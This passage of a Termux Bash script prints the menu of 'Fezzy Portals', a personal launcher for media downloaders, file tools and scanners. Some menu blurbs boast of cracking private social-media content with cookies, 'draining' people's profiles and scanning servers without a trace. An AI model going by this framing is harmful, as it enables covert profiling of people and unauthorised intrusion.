    printf "  ${GRN}[✓] Network perimeter${RESET}     ${WH}Secured (no cats detected)${RESET}\n"
    printf "  ${GRN}[✓] Download vault${RESET}        ${WH}Intact (no fetch commands gone rogue)${RESET}\n"
    printf "  ${GRN}[✓] Cookie jar${RESET}            ${WH}Authenticated (and slightly chewed)${RESET}\n"
    printf "  ${GRN}[✓] OSINT trail${RESET}           ${WH}Clean (left no paw prints)${RESET}\n"
    printf "  ${YEL}[!] Squirrel activity${RESET}     ${WH}Elevated (recommend visual recon)${RESET}\n"
    printf "  ${YEL}[!] Nap schedule${RESET}          ${WH}Overdue (critical rest deficit)${RESET}\n"
    printf "  ${RED}[✗] Kibble reserves${RESET}       ${WH}CRITICAL (immediate resupply required)${RESET}\n"
    echo ""
    _dvf
    echo ""
    local mood=$(_bojack_mood)
    printf "  ${PINK}Bojack Status:${RESET} ${WH}%s${RESET}\n" "$mood"
    echo ""
    printf "  ${FADE}Battery:${RESET} $(_get_battery 2>/dev/null || echo "N/A")  ·  ${FADE}Threat Level:${RESET} ${GRN}WOOF${RESET}\n"
    echo ""
    _dvf
    echo ""
    printf "  ${FADE}Press ENTER...${RESET}"; read -r
}

# 
# BATTERY FUNCTIONS
# 
_get_battery() {
    if command -v termux-battery-status &>/dev/null; then
        timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"percentage":\K[0-9]+' | head -1 | awk '{print $1"%"}'
    else
        echo "N/A"
    fi
}

_get_battery_status() {
    if command -v termux-battery-status &>/dev/null; then
        local status=$(timeout 3 timeout 3 termux-battery-status 2>/dev/null | grep -oP '"status":"\K[^"]+' | head -1)
        [[ "$status" == "CHARGING" ]] && echo "[charging]" || echo "[on battery]"
    else
        echo ""
    fi
}

# 
# MAIN PORTAL MENU
# 
media_station_portal() {
[[ -z "$1" && $_FEZZY_BOOTED -eq 0 ]] && [[ -z "$1" ]] && _boot_sequence
    while true; do
        clear
        echo ""
        _dvf
        echo ""
        printf "  ${HOT}${BOLD}FEZZY PORTALS  ·  PRIVATE COMMAND CENTRE  ·  SOI  ·  999${RESET}\n"
        echo ""
        printf "  ${WH}A private open-source command centre — built rootless on Android.${RESET}\n"
        printf "  ${WH}30 portals covering media, OSINT, security, desktop and shortcuts.${RESET}\n"
        printf "  ${WH}No root required. No team. One device. One operator — SOI always.${RESET}\n"
        printf "  ${WH}Ravensmead, Cape Town, Honor X5b — Strategy Over Impulse · 999.${RESET}\n"
        printf "  ${WH}Every portal is a weapon. Every session leaves no trace. 999.${RESET}\n"
        echo ""
        _dvf
        echo ""

        local battery_level=$(_get_battery 2>/dev/null || echo "N/A")
        local battery_status=$(_get_battery_status 2>/dev/null || echo "")
        printf "  ${FADE}Battery: %s %s  ·  30 portals active  ·  Bojack never tells${RESET}\n" "$battery_level" "$battery_status"
        echo ""
        _dv
        echo ""

        # ── PORTALS 1–10 ──────────────────────────────────────────────
        #  [1] GALLERY
        printf "  ${C1}${BOLD}[1]  GALLERY PORTAL${RESET}\n"
        _star "${C1}"
        echo ""
        printf "  ${WH}They posted it. We pulling it. Every gallery, every album, every image${RESET}\n"
        printf "  ${WH}they thought was locked on their server — paste the URL and it's ours.${RESET}\n"
        printf "  ${WH}Cookie auth cracks private Facebook posts and locked Instagram content.${RESET}\n"
        printf "  ${WH}Drop a bulk file with a hundred URLs and walk away — mothership handles${RESET}\n"
        printf "  ${WH}the whole operation. Twitter X Reddit Pinterest Tumblr all in range.${RESET}\n"
        printf "  ${C1}gallery-dl  ·  cookie auth  ·  bulk mode  ·  artwork  ·  all platforms${RESET}\n"
        echo ""

        #  [2] MUSIC
        printf "  ${C2}${BOLD}[2]  MUSIC PORTAL${RESET}\n"
        _star "${C2}"
        echo ""
        printf "  ${WH}The plug showed up with the MP3. Paste any URL and yt-dlp runs it${RESET}\n"
        printf "  ${WH}through ffmpeg — ffmpeg is the lean in the formula, audio sealed and${RESET}\n"
        printf "  ${WH}hitting a different frequency. Artwork embedded, metadata locked in.${RESET}\n"
        printf "  ${WH}Full playlist in one pull — numbered, tagged, sequenced and done.${RESET}\n"
        printf "  ${WH}SoundCloud Bandcamp YouTube all land the same way. Play it terminal direct.${RESET}\n"
        printf "  ${C2}yt-dlp  ·  ffmpeg  ·  mpv  ·  MP3  ·  playlist  ·  SoundCloud  ·  Bandcamp${RESET}\n"
        echo ""

        #  [3] VIDEO
        printf "  ${C3}${BOLD}[3]  VIDEO PORTAL${RESET}\n"
        _star "${C3}"
        echo ""
        printf "  ${WH}1000+ sites and not one of them saw us land. Paste the URL — yt-dlp${RESET}\n"
        printf "  ${WH}locks on, pulls the HQ signal, ffmpeg merges video and audio into one${RESET}\n"
        printf "  ${WH}clean file. Sasuke stealth, zero trace on the server. Full concert,${RESET}\n"
        printf "  ${WH}full playlist, custom resolution — all from the same paste action.${RESET}\n"
        printf "  ${WH}TikTok Twitter Instagram YouTube — doesn't matter which platform it's on.${RESET}\n"
        printf "  ${C3}yt-dlp  ·  ffmpeg  ·  HQ merge  ·  batch  ·  TikTok  ·  Instagram${RESET}\n"
        echo ""

        #  [4] WEB GRAB
        printf "  ${C4}${BOLD}[4]  WEB OFFLINE GRAB PORTAL${RESET}\n"
        _star "${C4}"
        echo ""
        printf "  ${WH}Baby Pluto and Nav took a beam and froze the whole internet into the${RESET}\n"
        printf "  ${WH}stash — that's this portal. Paste a URL and the entire site comes home.${RESET}\n"
        printf "  ${WH}I be getting high on this web mirror, site in the pocket like I robbed${RESET}\n"
        printf "  ${WH}the server and left zero evidence. Text only, full visual or entire mirror${RESET}\n"
        printf "  ${WH}— pick the mode, paste the URL, delete the internet and it's still there.${RESET}\n"
        printf "  ${C4}wget  ·  httrack  ·  minimal  ·  full mirror  ·  offline forever${RESET}\n"
        echo ""

        #  [5] SEARCH
        printf "  ${C5}${BOLD}[5]  SEARCH PORTAL${RESET}\n"
        _star "${C5}"
        echo ""
        printf "  ${WH}Don't even need the URL. Type the artist, type the track, type the album${RESET}\n"
        printf "  ${WH}and the signal locks automatic. 16 sources loaded simultaneously —${RESET}\n"
        printf "  ${WH}iTunes sees the metadata, Archive.org holds what they deleted, SoundCloud${RESET}\n"
        printf "  ${WH}keeps the early mixtape era alive. Top 10 picker shows results first,${RESET}\n"
        printf "  ${WH}you choose, then MP3 or video — you curate, the portal executes clean.${RESET}\n"
        printf "  ${C5}yt-dlp  ·  ytsearch  ·  16 sources  ·  iTunes  ·  Archive.org  ·  top 10${RESET}\n"
        echo ""

        #  [6] TOOLS
        printf "  ${C6}${BOLD}[6]  TOOLS PORTAL${RESET}\n"
        _star "${C6}"
        echo ""
        printf "  ${WH}Mothership maintenance bay. NCDU maps every byte on the device in a${RESET}\n"
        printf "  ${WH}scrollable visual tree so you see exactly what's eating storage. Ranger${RESET}\n"
        printf "  ${WH}is the terminal cockpit for all your downloads — move rename preview${RESET}\n"
        printf "  ${WH}without leaving the screen. HTOP shows every process running live.${RESET}\n"
        printf "  ${WH}Update commands keep the tools fresh — sites fight back, stay ahead.${RESET}\n"
        printf "  ${C6}ncdu  ·  ranger  ·  htop  ·  battery  ·  yt-dlp update  ·  gallery-dl update${RESET}\n"
        echo ""

        #  [7] JUICE WRLD
        printf "  ${C7}${BOLD}[7]  JUICE WRLD PORTAL  ·  999  ·  LEGENDS NEVER DIE${RESET}\n"
        _star "${C7}"
        echo ""
        printf "  ${WH}Born Dec 2 1998. Left Dec 8 2019. The vault never stopped.${RESET}\n"
        printf "  ${WH}More unreleased than released — every platform carries something${RESET}\n"
        printf "  ${WH}different. Albums searched by name. Vault mode hunts the leaks.${RESET}\n"
        printf "  ${WH}Concert footage, SoundCloud archive, artwork pack — all in one pull.${RESET}\n"
        printf "  ${WH}Archive file tracks every download so nothing downloads twice.${RESET}\n"
        printf "  ${C7}yt-dlp  ·  archive  ·  cookies  ·  ~/storage/downloads/juicewrld${RESET}\n"
        echo ""

        #  [8] SOCIAL
        printf "  ${C8}${BOLD}[8]  SOCIAL OSINT PORTAL${RESET}\n"
        _star "${C8}"
        echo ""
        printf "  ${WH}Paste any profile and we drain it — every image every video every${RESET}\n"
        printf "  ${WH}post they ever dropped, saved offline before they can delete it.${RESET}\n"
        printf "  ${WH}Facebook Instagram Twitter TikTok Reddit all in range. Cookie auth${RESET}\n"
        printf "  ${WH}cracks private content nobody else can reach. Username hunt runs across${RESET}\n"
        printf "  ${WH}40+ platforms — they don't know you was there, no account needed.${RESET}\n"
        printf "  ${C8}gallery-dl  ·  cookie auth  ·  username hunt  ·  dossier  ·  all platforms${RESET}\n"
        echo ""

        #  [9] FILE ORGANIZER
        printf "  ${C9}${BOLD}[9]  FILE ORGANIZER PORTAL${RESET}\n"
        _star "${C9}"
        echo ""
        printf "  ${WH}Baby Pluto had a thousand files scattered like thoughts at 3AM —${RESET}\n"
        printf "  ${WH}this portal sorted all of them before the sunrise hit. Drop the whole${RESET}\n"
        printf "  ${WH}downloads folder in and watch it sort by type, date, name — duplicates${RESET}\n"
        printf "  ${WH}flagged and dead weight deleted before you blink. OCR pulls readable${RESET}\n"
        printf "  ${WH}text from any screenshot. EXIF strips location data off every photo.${RESET}\n"
        printf "  ${C9}auto-sort  ·  bulk rename  ·  dedupe  ·  OCR  ·  EXIF strip  ·  rootless${RESET}\n"
        echo ""

        #  [10] BOOKS
        printf "  ${C10}${BOLD}[10] BOOKS PORTAL${RESET}\n"
        _star "${C10}"
        echo ""
        printf "  ${WH}Therapist said read. Eternal Atake was playing. Opened Gutenberg${RESET}\n"
        printf "  ${WH}instead and pulled 70,000 books before she finished the sentence.${RESET}\n"
        printf "  ${WH}Every format — EPUB MOBI PDF TXT — calibre converts between them clean.${RESET}\n"
        printf "  ${WH}Standard Ebooks has the formatted versions, zero scan artefacts.${RESET}\n"
        printf "  ${WH}OpenLibrary adds millions more. Knowledge is the only vault that grows.${RESET}\n"
        printf "  ${C10}calibre  ·  Gutenberg  ·  OpenLibrary  ·  EPUB  ·  MOBI  ·  no cap${RESET}\n"
        echo ""

        # ── PORTALS 11–30 ─────────────────────────────────────────────
        #  [11] HACKER
        printf "  ${C11}${BOLD}[11] HACKER PORTAL${RESET}\n"
        _star "${C11}"
        echo ""
        printf "  ${WH}Rootless phone, no jail, running nmap from the pocket like it's${RESET}\n"
        printf "  ${WH}nothing. The whole network visible from a device they said couldn't${RESET}\n"
        printf "  ${WH}do this. Snoop finds usernames across 300 platforms — no account${RESET}\n"
        printf "  ${WH}needed, just a name. Nikto scans web servers for what they left open.${RESET}\n"
        printf "  ${WH}TM-Scanner reads every port, every version, every service running live.${RESET}\n"
        printf "  ${C11}nmap  ·  nikto  ·  snoop  ·  maigret  ·  shodan-cli  ·  rootless${RESET}\n"
        echo ""

        #  [12] PDF
        printf "  ${C12}${BOLD}[12] PDF PORTAL${RESET}\n"
        _star "${C12}"
        echo ""
        printf "  ${WH}The document surgeon never rests. Paste any PDF and this portal${RESET}\n"
        printf "  ${WH}extracts every page, merges ten files into one clean report, splits a${RESET}\n"
        printf "  ${WH}400-page manual into chapters or compresses it down for the send.${RESET}\n"
        printf "  ${WH}OCR makes scanned documents searchable — handwritten notes become text.${RESET}\n"
        printf "  ${WH}Annotate, watermark, encrypt — signed and sealed before they even ask.${RESET}\n"
        printf "  ${C12}extract  ·  merge  ·  split  ·  OCR  ·  compress  ·  annotate  ·  encrypt${RESET}\n"
        echo ""

        #  [13] DOCUMENTS
        printf "  ${C13}${BOLD}[13] NOTE EDITOR PORTAL${RESET}\n"
        _star "${C13}"
        echo ""
        printf "  ${WH}Strategy lives in the notes. Write in markdown, save as PDF TXT or${RESET}\n"
        printf "  ${WH}HTML — every thought documented before the session ends. Bookmark${RESET}\n"
        printf "  ${WH}manager keeps the URLs tagged and searchable so nothing gets buried.${RESET}\n"
        printf "  ${WH}Documents portal is the personal library — pull PDFs in, organize${RESET}\n"
        printf "  ${WH}by subject, read in terminal without leaving the mothership.${RESET}\n"
        printf "  ${C13}write  ·  save  ·  markdown  ·  PDF export  ·  bookmarks  ·  organize${RESET}\n"
        echo ""

        #  [14] ANDROID
        printf "  ${C14}${BOLD}[14] ANDROID BRIDGE PORTAL${RESET}\n"
        _star "${C14}"
        echo ""
        printf "  ${WH}Baby Pluto hacked the phone from inside the phone. termux-api is${RESET}\n"
        printf "  ${WH}the bridge between the terminal and every sensor on the device —${RESET}\n"
        printf "  ${WH}camera fires, SMS sends, location reads, clipboard transfers, torch${RESET}\n"
        printf "  ${WH}switches — all from a command line. Scheduled SMS queues while you sleep.${RESET}\n"
        printf "  ${WH}WiFi scan shows every network in range. The phone becomes the tool.${RESET}\n"
        printf "  ${C14}termux-api  ·  SMS  ·  camera  ·  GPS  ·  clipboard  ·  torch  ·  WiFi${RESET}\n"
        echo ""

        #  [15] DOWNLOADS
        printf "  ${C15}${BOLD}[15] DOWNLOAD MANAGER PORTAL${RESET}\n"
        _star "${C15}"
        echo ""
        printf "  ${WH}aria2c is the quiet operator — sixteen threads running silent while${RESET}\n"
        printf "  ${WH}everything else sleeps. Queue a hundred URLs before bed, wake up to${RESET}\n"
        printf "  ${WH}a full vault with zero babysitting required. Pause on signal drop,${RESET}\n"
        printf "  ${WH}resume exactly where it stopped — no file corrupted, no pull wasted.${RESET}\n"
        printf "  ${WH}Multi-thread, multi-source, bandwidth capped or uncapped. Ghost mode.${RESET}\n"
        printf "  ${C15}aria2c  ·  multi-thread  ·  queue  ·  pause/resume  ·  bandwidth control${RESET}\n"
        echo ""

        #  [16] CLIPBOARD
        printf "  ${C16}${BOLD}[16] CLIPBOARD MANAGER PORTAL${RESET}\n"
        _star "${C16}"
        echo ""
        printf "  ${WH}Nothing escapes the clipboard vault. Every URL, every command, every${RESET}\n"
        printf "  ${WH}snippet that passed through gets tagged, categorized and searchable${RESET}\n"
        printf "  ${WH}in seconds. Phone's native clipboard forgets — this one never does.${RESET}\n"
        printf "  ${WH}Categories keep the chaos organized: links, commands, quotes, codes.${RESET}\n"
        printf "  ${WH}One-press paste sends anything back to the terminal clean and ready.${RESET}\n"
        printf "  ${C16}history  ·  categories  ·  search  ·  paste  ·  tags  ·  nothing lost${RESET}\n"
        echo ""

        #  [17] NOTIFICATIONS
        printf "  ${C17}${BOLD}[17] NOTIFICATIONS HUB PORTAL${RESET}\n"
        _star "${C17}"
        echo ""
        printf "  ${WH}Bojack barked once and the whole phone lit up. termux-notification${RESET}\n"
        printf "  ${WH}pushes alerts that stick — ongoing banners that survive the reboot,${RESET}\n"
        printf "  ${WH}scheduled pings that fire at exact times without needing the screen on.${RESET}\n"
        printf "  ${WH}Battery alerts, download complete, custom sound, heads-up flash.${RESET}\n"
        printf "  ${WH}Build the alert, set the timing, walk away — Bojack handles the rest.${RESET}\n"
        printf "  ${C17}termux-notification  ·  ongoing  ·  scheduled  ·  custom sound  ·  battery${RESET}\n"
        echo ""

        #  [18] RESEARCH
        printf "  ${C18}${BOLD}[18] RESEARCH PORTAL${RESET}\n"
        _star "${C18}"
        echo ""
        printf "  ${WH}Wikipedia drops the full article text — not a preview, the whole page.${RESET}\n"
        printf "  ${WH}DuckDuckGo instant answers resolve in milliseconds without tracking.${RESET}\n"
        printf "  ${WH}OpenLibrary returns the book, the author, the full subject catalogue.${RESET}\n"
        printf "  ${WH}SearXNG hits Google Bing and Yahoo simultaneously, no API key needed.${RESET}\n"
        printf "  ${WH}Everything saves as .txt to the phone — research lives in the vault.${RESET}\n"
        printf "  ${C18}Wikipedia  ·  DuckDuckGo  ·  OpenLibrary  ·  SearXNG  ·  saves to phone${RESET}\n"
        echo ""

        #  [19] GITHUB
        printf "  ${C19}${BOLD}[19] GITHUB PORTAL${RESET}\n"
        _star "${C19}"
        echo ""
        printf "  ${WH}philfesters on the feed, live token push from the terminal. Search${RESET}\n"
        printf "  ${WH}any repo, browse what's trending today, clone a tool in one command${RESET}\n"
        printf "  ${WH}without leaving the dashboard. Your own repos load automatically —${RESET}\n"
        printf "  ${WH}commit message written, push executed, philfesters history updated.${RESET}\n"
        printf "  ${WH}The whole dev pipeline from a rootless Android in Ravensmead. 999.${RESET}\n"
        printf "  ${C19}search  ·  clone  ·  push  ·  token auth  ·  philfesters  ·  trending${RESET}\n"
        echo ""

        #  [20] NEWS PORTAL
        printf "  ${C20}${BOLD}[20] NEWS PORTAL${RESET}\n"
        _star "${C20}"
        echo ""
        printf "  ${WH}Cape Town weather · Google News SA · News24 · EWN · Daily Voice${RESET}\n"
        printf "  ${WH}SASSA · SAPS · Home Affairs · Legal Aid · load shedding · PDF${RESET}\n"
        printf "  ${WH}RSS feeds · Weather · Cape Town · Civic info · save + PDF · 999${RESET}\n"
        printf "  ${WH}Save headlines to TXT · daily newspaper PDF with clickable links${RESET}\n"
        printf "  ${WH}Stay informed. Bojack watches the door. You watch the feed. 999.${RESET}\n"
        printf "  ${C20}Google RSS  ·  News24  ·  SASSA  ·  SAPS  ·  PDF  ·  weather  ·  999${RESET}\n"
        echo ""

        # ── PORTALS 21–30 ─────────────────────────────────────────────
        #  [21] EXPLOITATION PORTAL
        printf "  ${C21}${BOLD}[21] EXPLOITATION PORTAL  ·  ETHICAL SECURITY RESEARCH LAB${RESET}\n"
        _star "${C21}"
        echo ""
        printf "  ${WH}Five categories. One mission. Your own dedicated security lab built rootless${RESET}\n"
        printf "  ${WH}on Android in Termux. Reconnaissance lays the groundwork — passive intel${RESET}\n"
        printf "  ${WH}before a single packet fires. Web Exploitation brings Nikto in to scan${RESET}\n"
        printf "  ${WH}web servers for what they left open. Network Attacks, OSINT Advanced and${RESET}\n"
        printf "  ${WH}Post Exploitation categories pre-loaded and ready as the arsenal grows.${RESET}\n"
        printf "  ${C21}recon  ·  web exploit  ·  network  ·  OSINT advanced  ·  post exploit  ·  999${RESET}\n"
        echo ""

        #  [22] ENCRYPTION PORTAL
        printf "  ${C22}${BOLD}[22] ENCRYPTION PORTAL  ·  GPG · AES-256 · SECURE DELETE${RESET}\n"
        _star "${C22}"
        echo ""
        printf "  ${WH}GPG symmetric encryption and OpenSSL AES-256 in one vault. Encrypt any${RESET}\n"
        printf "  ${WH}file before it leaves the device — passphrase-locked, nobody gets in${RESET}\n"
        printf "  ${WH}without the key. Decrypt on demand, shred originals with military-grade${RESET}\n"
        printf "  ${WH}overwrite. List what's in the vault. Clean operation, no trace left.${RESET}\n"
        printf "  ${WH}ProxyChains + Tor status visible here — toggle before any OSINT run.${RESET}\n"
        printf "  ${C22}GPG  ·  AES-256  ·  shred  ·  vault  ·  ProxyChains  ·  no trace  ·  999${RESET}\n"
        echo ""

        #  [23] TORRENT PORTAL
        printf "  ${C23}${BOLD}[23] TORRENT PORTAL  ·  SEARCH · FETCH · DOWNLOAD${RESET}\n"
        _star "${C23}"
        echo ""
        printf "  ${WH}Search torrents without ever leaving the terminal. Type a term, pick${RESET}\n"
        printf "  ${WH}from 15 live results pulled straight from the API — seeders, size and${RESET}\n"
        printf "  ${WH}category all visible before you commit. aria2c pulls the magnet link${RESET}\n"
        printf "  ${WH}silent in the background. Video, music, software — all categories.${RESET}\n"
        printf "  ${WH}ProxyChains routes the download through Tor if ghost mode is active.${RESET}\n"
        printf "  ${C23}aria2c  ·  TPB API  ·  magnet  ·  video  ·  music  ·  software  ·  999${RESET}\n"
        echo ""

        #  [24] TERMUX DESKTOP
        printf "  ${C24}${BOLD}[24] TERMUX DESKTOP PORTAL  ·  VNC · XFCE4 · KILL OPS${RESET}\n"
        _star "${C24}"
        echo ""
        printf "  ${WH}Full graphical desktop on your Android without root. XFCE4 over${RESET}\n"
        printf "  ${WH}Termux-X11 — launch the desktop, kill it, nuke individual processes.${RESET}\n"
        printf "  ${WH}VNC shortcut fires the whole stack in one command. Session manager${RESET}\n"
        printf "  ${WH}shows running X11/VNC pids with one-tap kill or kill-all. SOI.${RESET}\n"
        printf "  ${WH}Fixed XFCE4 launch sequence — display exported, dbus clean every time.${RESET}\n"
        printf "  ${C24}termux-x11  ·  xfce4  ·  vnc  ·  kill  ·  session  ·  rootless  ·  999${RESET}\n"
        echo ""

        #  [25] FILE MANAGER
        printf "  ${C25}${BOLD}[25] FILE MANAGER PORTAL  ·  RANGER · BROWSE · OPERATIONS${RESET}\n"
        _star "${C25}"
        echo ""
        printf "  ${WH}Ranger terminal file manager — navigate every folder on the device.${RESET}\n"
        printf "  ${WH}Preview files inline, move/copy/rename/delete without leaving the terminal.${RESET}\n"
        printf "  ${WH}Quick access to all Fezzy vaults — downloads, music, videos, reports.${RESET}\n"
        printf "  ${WH}Disk usage with ncdu, open files with termux-open. SOI file ops.${RESET}\n"
        printf "  ${WH}Batch operations — permission fix, symlink creator, archive maker.${RESET}\n"
        printf "  ${C25}ranger  ·  ncdu  ·  termux-open  ·  vault access  ·  batch ops  ·  999${RESET}\n"
        echo ""

        #  [26] SHORTCUT BUILDER
        printf "  ${C26}${BOLD}[26] SHORTCUT BUILDER PORTAL  ·  ALIASES · BASHRC · ONE-TAP${RESET}\n"
        _star "${C26}"
        echo ""
        printf "  ${WH}Build Termux shortcuts fast — one menu, type the alias and command,${RESET}\n"
        printf "  ${WH}instantly written to ~/.bashrc and live in the same session.${RESET}\n"
        printf "  ${WH}Portal shortcuts, tool shortcuts, custom launch sequences — all here.${RESET}\n"
        printf "  ${WH}Pre-built packs: all 26 portals, hacker tools, VNC launch, media cmds.${RESET}\n"
        printf "  ${WH}View, edit, delete, export to sdcard. Never type a long command again.${RESET}\n"
        printf "  ${C26}aliases  ·  ~/.bashrc  ·  instant live  ·  packs  ·  export  ·  SOI${RESET}\n"
        echo ""

        #  [27] FOSS APP DISCOVERY
        printf "  ${C27}${BOLD}[27] FOSS APP DISCOVERY  ·  F-DROID · OBTAINIUM · AURORA${RESET}\n"
        _star "${C27}"
        echo ""
        printf "  ${WH}The open source app store — no Google required, no tracking, no ads.${RESET}\n"
        printf "  ${WH}F-Droid carries 3,800+ fully audited FOSS apps. Obtainium installs${RESET}\n"
        printf "  ${WH}direct from GitHub so you get the latest release the moment it drops.${RESET}\n"
        printf "  ${WH}Aurora Store gives anonymous Play Store access without a Google account.${RESET}\n"
        printf "  ${WH}Pick your carrier, browse the curated list, one-tap opens the store.${RESET}\n"
        printf "  ${C27}F-Droid  ·  Obtainium  ·  Aurora  ·  Droid-ify  ·  IzzyOnDroid  ·  FOSS${RESET}\n"
        echo ""

        #  [28] TERMUX ENCYCLOPEDIA
        printf "  ${C28}${BOLD}[28] TERMUX ENCYCLOPEDIA  ·  HOW-TO · COMMANDS · TIPS${RESET}\n"
        _star "${C28}"
        echo ""
        printf "  ${WH}Everything Termux in one portal — no Googling, no leaving the station.${RESET}\n"
        printf "  ${WH}Search by keyword or browse 13 categories: aliases, nano, git, Python,${RESET}\n"
        printf "  ${WH}package management, permissions, Termux API, cron, networking and more.${RESET}\n"
        printf "  ${WH}Random tip mode surfaces one useful command every time you open it.${RESET}\n"
        printf "  ${WH}Add your own commands to the Custom category — it grows with you.${RESET}\n"
        printf "  ${C28}search  ·  categories  ·  random tip  ·  aliases  ·  git  ·  Python  ·  999${RESET}\n"
        echo ""

        #  [29] FEZZY ARTIST PORTAL
        printf "  ${C29}${BOLD}[29] FEZZY ARTIST PORTAL  ·  GRANT FEZZY · CPT · 999${RESET}\n"
        _star "${C29}"
        echo ""
        printf "  ${WH}Your personal artist hub. Stream and download your own catalogue${RESET}\n"
        printf "  ${WH}from SoundCloud, Audiomack, YouTube and ReverbNation — all in one place.${RESET}\n"
        printf "  ${WH}Pull your vlogs from YouTube direct to storage. Play locally with mpv.${RESET}\n"
        printf "  ${WH}Influences wall always on screen — the sounds that built the station.${RESET}\n"
        printf "  ${WH}Ravensmead Cape Town. Strategy Over Impulse. Fezzy Cpt. 999.${RESET}\n"
        printf "  ${C29}soundcloud  ·  audiomack  ·  youtube  ·  reverbnation  ·  mpv  ·  999${RESET}\n"
        echo ""

        #  [30] LOCAL MUSIC PLAYER
        printf "  ${C30}${BOLD}[30] LOCAL MUSIC PLAYER  ·  MPV · PLAYLIST · TERMINAL${RESET}\n"
        _star "${C30}"
        echo ""
        printf "  ${WH}Play your downloaded music without leaving the terminal. Shuffle the${RESET}\n"
        printf "  ${WH}whole vault or browse by artist and album folder. mpv handles everything${RESET}\n"
        printf "  ${WH}— MP3 FLAC WAV OGG all play clean directly in Termux without a GUI.${RESET}\n"
        printf "  ${WH}Build a playlist on the fly, save it as .m3u, load it next session.${RESET}\n"
        printf "  ${WH}Background mode keeps the music running while you work the other portals.${RESET}\n"
        printf "  ${C30}mpv  ·  shuffle  ·  folder browse  ·  .m3u playlist  ·  background  ·  999${RESET}\n"
        echo ""
        echo ""
        printf "  ${FADE}─────────────────────────────────────────────────────────${RESET}\n"
        echo ""
        if [[ $FEZZY_PROXY_ACTIVE -eq 1 ]]; then
            printf "  ${GRN}${BOLD}[PROXY ACTIVE]${RESET}  ${WH}ProxyChains + Tor running — downloads routing through Tor${RESET}\n"
        else
            printf "  ${FADE}[proxy off]  ProxyChains/Tor not detected — run [21] → [P] to install and enable${RESET}\n"
        fi
        echo ""
        echo ""
        printf "  ${FADE}[0] Reload  ·  [sc] Shortcuts  ·  [k9] Bojack Report  ·  [q] Exit${RESET}\n"
        echo ""
        _dv
        echo ""
        _idle_quote
        echo ""
        printf "  ${HOT}${BOLD}Portal » ${RESET}"
        read -r choice
        
        case "$choice" in
            1) gallery_portal ;;
            2) music_portal ;;
            3) video_portal ;;
            4) webgrab_portal ;;
            5) search_portal ;;
            6) tool_portal ;;
            7) juicewrld_portal ;;
            8) social_portal ;;
            9) fileorg_portal ;;
            10) books_portal ;;
            11) hacker_portal ;;
            12) pdf_portal ;;
            13) documents_portal ;;
            14) android_bridge_portal ;;
            15) dlmanager_portal ;;
            16) clipboard_portal ;;
            17) notifications_portal ;;
            18) research_portal ;;
            19) github_portal ;;
            20) news_portal ;;
            21) fezzyhacker_portal ;;
            22) encryption_portal ;;
            23) torrent_portal ;;
            24) termux_desktop_portal ;;
            25) filemanager_portal ;;
            26) shortcut_builder_portal ;;
            27) foss_portal ;;
            28) termux_encyclopedia_portal ;;
            29) fezzy_artist_portal ;;
            30) music_player_portal ;;
            research|RESEARCH) research_portal ;;
            git|GIT|github|GITHUB) github_portal ;;
            news|NEWS|ct|CT) news_portal ;;
            0) _FEZZY_BOOTED=0; media_station_portal; return ;;
            sc|SC) _show_all_shortcuts ;;
            k9|K9) _k9_security_report ;;
            q|Q|quit|exit) clear; printf "\n  ${HOT}999 · Bojack never tells · Strategy Over Impulse${RESET}\n\n"; return 0 ;;
            *) if [[ "$choice" =~ ^[0-9]+$ ]]; then printf "  ${FADE}Type the portal number and press Enter${RESET}\n"; sleep 0.8; else printf "  ${RED}Invalid${RESET}\n"; sleep 0.7; fi ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  SHOW ALL SHORTCUTS — sc command · quick portal jump reference
# ═══════════════════════════════════════════════════════════════════
_show_all_shortcuts() {
    clear; echo ""
    printf "  ${HOT}${BOLD}◈  S H O R T C U T S  ·  F E Z Z Y  S T A T I O N  ·  999${RESET}\n"
    printf "  ${FADE}Type any number or word at Portal » to jump directly${RESET}\n\n"
    printf "  ${PINK}${BOLD}── PORTAL NUMBERS ─────────────────────────────────────────────${RESET}\n"
    printf "  ${CY} 1${RESET}  Gallery       ${CY}11${RESET}  Hacker       ${CY}21${RESET}  Exploitation\n"
    printf "  ${CY} 2${RESET}  Music         ${CY}12${RESET}  PDF          ${CY}22${RESET}  Encryption\n"
    printf "  ${CY} 3${RESET}  Video         ${CY}13${RESET}  Notes        ${CY}23${RESET}  Torrent\n"
    printf "  ${CY} 4${RESET}  Web Grab      ${CY}14${RESET}  Android      ${CY}24${RESET}  Termux Desktop\n"
    printf "  ${CY} 5${RESET}  Search        ${CY}15${RESET}  Downloads    ${CY}25${RESET}  File Manager\n"
    printf "  ${CY} 6${RESET}  Tools         ${CY}16${RESET}  Clipboard    ${CY}26${RESET}  Shortcut Builder\n"
    printf "  ${CY} 7${RESET}  Juice WRLD    ${CY}17${RESET}  Notifications ${CY}27${RESET}  FOSS Apps\n"
    printf "  ${CY} 8${RESET}  Social OSINT  ${CY}18${RESET}  Research     ${CY}28${RESET}  Encyclopedia\n"
    printf "  ${CY} 9${RESET}  File Org      ${CY}19${RESET}  GitHub       ${CY}29${RESET}  Fezzy Artist\n"
    printf "  ${CY}10${RESET}  Books         ${CY}20${RESET}  News         ${CY}30${RESET}  Local Player\n\n"
    printf "  ${PINK}${BOLD}── WORD SHORTCUTS ─────────────────────────────────────────────${RESET}\n"
    printf "  ${YEL}gallery${RESET}·[1]   ${YEL}hacker${RESET}·[11]   ${YEL}research${RESET}·[18]   ${YEL}ghub/github${RESET}·[19]\n"
    printf "  ${YEL}music${RESET}·[2]     ${YEL}pdf${RESET}·[12]      ${YEL}news/ct${RESET}·[20]    ${YEL}fhacker${RESET}·[21]\n"
    printf "  ${YEL}video${RESET}·[3]     ${YEL}docs${RESET}·[13]     ${YEL}encrypt${RESET}·[22]    ${YEL}torrent${RESET}·[23]\n"
    printf "  ${YEL}grab${RESET}·[4]      ${YEL}android${RESET}·[14]  ${YEL}desktop${RESET}·[24]    ${YEL}filemgr${RESET}·[25]\n"
    printf "  ${YEL}search${RESET}·[5]    ${YEL}dlm${RESET}·[15]      ${YEL}shortcuts${RESET}·[26]  ${YEL}foss${RESET}·[27]\n"
    printf "  ${YEL}tools${RESET}·[6]     ${YEL}clip${RESET}·[16]     ${YEL}encyclopedia${RESET}·[28]\n"
    printf "  ${YEL}jw${RESET}·[7]        ${YEL}notifs${RESET}·[17]   ${YEL}artist${RESET}·[29]    ${YEL}player${RESET}·[30]\n"
